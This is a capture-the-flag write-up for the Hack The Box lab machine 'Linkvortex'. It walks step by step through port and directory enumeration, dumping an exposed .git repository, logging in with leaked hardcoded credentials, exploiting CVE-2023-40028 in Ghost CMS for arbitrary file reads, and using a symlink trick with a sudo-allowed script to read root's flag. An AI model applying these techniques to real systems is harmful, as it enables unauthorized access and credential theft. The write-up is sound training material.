@@ -1,0 +1,245 @@
+---
+title: linkvortex
+date: '2024-12-27'
+description: preview
+type: writeup
+platform: hackthebox
+tags:
+  - ACTIVE MACHINE
+  - Easy
+  - LINUX
+cover: /mc/uploads/2025/01/GeIZjK9XIAAd6hT.jpg
+---
+
+# بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ
+
+
+In this write-up, we will walk through the steps to hack the Linkvortex machine on Hack The Box. Let's dive in!
+
+## Initial Enumeration with Nmap
+
+We start by scanning the target machine for open ports using Nmap:
+
+```bash
+$ nmap -sV 10.10.11.47 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-27 07:01 EST
+Nmap scan report for linkvortex.htb (10.10.11.47)
+Host is up (0.064s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.11 seconds
+```
+We find two open ports:
+
+- **Port 22**: SSH (OpenSSH 8.9p1)
+- **Port 80**: HTTP (Apache)
+
+## Enumeration of HTTP Service
+
+We proceed to brute-force directories using Dirsearch:
+
+```bash
+$ dirsearch -u http://linkvortex.htb/ -x 404
+
+ [07:05:48] 200 -  103B  - /robots.txt
+ [07:05:51] 200 -  256B  - /sitemap.xml
+ [07:05:49] 403 -  199B  - /server-status                                   
+
+Task Completed
+```
+The /robots.txt file reveals the following:
+
+```text
+Disallow: /ghost/
+```
+
+This indicates a potential login page at /ghost/.
+
+## Subdomain Enumeration
+
+Using FFUF, we enumerate subdomains:
+
+```bash
+$ ffuf -u http://linkvortex.htb/ -w SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host:FUZZ.linkvortex.htb" -mc 200
+
+ dev                     [ Status: 200, Size: 2538, Words: 670, Lines: 116]
+```
+We discover a subdomain dev.linkvortex.htb. Adding this to our /etc/hosts file allows us to access it.
+
+##  Enumerating dev.linkvortex.htb
+
+We run Dirsearch again on the subdomain:
+
+```bash
+$  dirsearch -u dev.linkvortex.htb
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /home/kali/reports/_dev.linkvortex.htb/_24-12-27_07-25-41.txt
+
+Target: http://dev.linkvortex.htb/
+
+ [07:25:41] Starting:                                                                                                                              
+ [07:25:43] 200 -   73B  - /.git/description                                 
+ [07:25:43] 200 -  201B  - /.git/config                                      
+ [07:25:43] 200 -  620B  - /.git/hooks/
+ [07:25:43] 200 -  557B  - /.git/                                            
+ [07:25:43] 200 -   41B  - /.git/HEAD
+ [07:25:43] 301 -  239B  - /.git  ->  http://dev.linkvortex.htb/.git/        
+ [07:25:43] 200 -  402B  - /.git/info/                                       
+ [07:25:43] 200 -  401B  - /.git/logs/
+ [07:25:43] 200 -  175B  - /.git/logs/HEAD                                   
+ [07:25:43] 200 -  240B  - /.git/info/exclude                                
+ [07:25:44] 200 -  393B  - /.git/refs/                                       
+ [07:25:44] 200 -  418B  - /.git/objects/
+ [07:25:44] 200 -  147B  - /.git/packed-refs                                 
+ [07:25:44] 301 -  249B  - /.git/refs/tags  ->  http://dev.linkvortex.htb/.git/refs/tags/
+ [07:25:44] 200 -  691KB - /.git/index                                       
+ [07:25:44] 403 -  199B  - /.ht_wsr.txt                                      
+ [07:25:44] 403 -  199B  - /.htaccess.bak1                                   
+ [07:25:44] 403 -  199B  - /.htaccess.orig                                   
+ [07:25:44] 403 -  199B  - /.htaccess.sample                                 
+ [07:25:44] 403 -  199B  - /.htaccess_extra                                  
+ [07:25:44] 403 -  199B  - /.htaccessBAK
+ [07:25:44] 403 -  199B  - /.htaccessOLD2
+ [07:25:44] 403 -  199B  - /.htaccess.save                                   
+ [07:25:44] 403 -  199B  - /.htm
+ [07:25:44] 403 -  199B  - /.htaccess_sc
+ [07:25:44] 403 -  199B  - /.htaccess_orig
+ [07:25:44] 403 -  199B  - /.htaccessOLD                                     
+ [07:25:44] 403 -  199B  - /.html
+ [07:25:44] 403 -  199B  - /.htpasswd_test                                   
+ [07:25:44] 403 -  199B  - /.htpasswds                                       
+ [07:25:44] 403 -  199B  - /.httr-oauth
+ [07:26:03] 403 -  199B  - /cgi-bin/                                         
+ [07:26:30] 403 -  199B  - /server-status/                                   
+ [07:26:30] 403 -  199B  - /server-status                                    
+ Task Completed
+```
+The presence of the .git directory suggests potential sensitive information.  
+We use GitHack to extract its contents:
+
+```bash
+$ python Githack.py http://dev.linkvortex.htb/.git/
+```
+The extracted files include authentication.test.js, which contains hardcoded  
+credentials:
+
+```text
+ const password = 'OctopiFociPilfer45';
+```
+
+## Exploiting the Login Page
+
+We use the credentials to log in to /ghost/:
+
+- **Username**: admin@linkvortex.htb
+- **Password**: OctopiFociPilfer45
+
+After logging in, we find the machine is running a vulnerable version of Ghost CMS.  
+We exploit CVE-2023-40028 to read arbitrary files:  
+BTW: after downloading the CVE change the URL from the host the
+
+http://linkvortex.htb
+
+read the config file that we found in dockerfile.ghost
+
+```bash
+$ bash CVE-2023-40028 -u admin@linkvortex.htb -p OctopiFociPilfer45
+ WELCOME TO THE CVE-2023-40028 SHELL
+ file> /var/lib/ghost/config.production.json
+```
+The exploit reveals the following:
+
+```bash
+
+  {
+  "url": "http://localhost:2368",
+  "server": {
+    "port": 2368,
+    "host": "::"
+  },{
+  "mail": {
+    "transport": "Direct"
+  },{
+  "logging": {
+    "transports": ["stdout"]
+  },{
+  "process": "systemd",
+  "paths": {
+    "contentPath": "/var/lib/ghost/content"
+  },{
+  "spam": {
+    "user_login": {
+        "minWait": 1,
+        "maxWait": 604800000,
+        "freeRetries": 5000
+    },{
+  "mail": {
+     "transport": "SMTP",
+     "options": {
+      "service": "Google",
+      "host": "linkvortex.htb",
+      "port": 587,
+      "auth": {
+        "user": "bob@linkvortex.htb",
+        "pass": "fibber-talented-worth"
+
+      }
+```
+Finally i try soo many time to get that i thought the CVE isnt working but idk somehow it works  
+so we got the password and the username.  
+Using the credentials:
+
+- **Username**: bob@linkvortex.htb
+- **Password**: fibber-talented-worth
+
+## SSH Access
+
+```bash
+$ ssh bob@linkvortex.htb
+ # bob@linkvortex.htb's password: fibber-talented-worth
+
+$ bob@linkvortex:~$ cat user.txt
+a6acafe1314c70.... # u can do it
+```
+## Privilege Escalation
+
+We check Bob's sudo privileges:
+
+```bash
+$ bob@linkvortex:~$ sudo -l 
+ Matching Defaults entries for bob on linkvortex:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin, use_pty,
+    env_keep+=CHECK_CONTENT
+
+ User bob may run the following commands on linkvortex:
+    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
+```
+after reading the code of the clean\_symlink.sh , The script allows us to use symbolic links to read files.  
+We exploit it to read /root/root.txt:
+
+```bash
+bob@linkvortex:~$ ln -s /root/root.txt nutzh.txt #so we create a link between nutzh and root.txt
+bob@linkvortex:~$ ln -s /home/bob/nutzh.txt bob.png # look the clean_symlink code he can read through the image files
+bob@linkvortex:~$ sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/bob.png
+ Link found [ /home/bob/bob.png ] , moving it to quarantine
+ Content:
+ c2f05024dc11bbd7dad.... #u got this mate
+```
+## Key Takeaways:
+
+Use enumeration tools like Dirsearch, FFUF, and GitHack to uncover hidden resources.
+
+Exploit known vulnerabilities (e.g., CVE-2023-40028) for information disclosure.
+
+Understand symlink exploitation to escalate privileges.
+
+ Congratulations! You've rooted the Linkvortex machine. 🎉
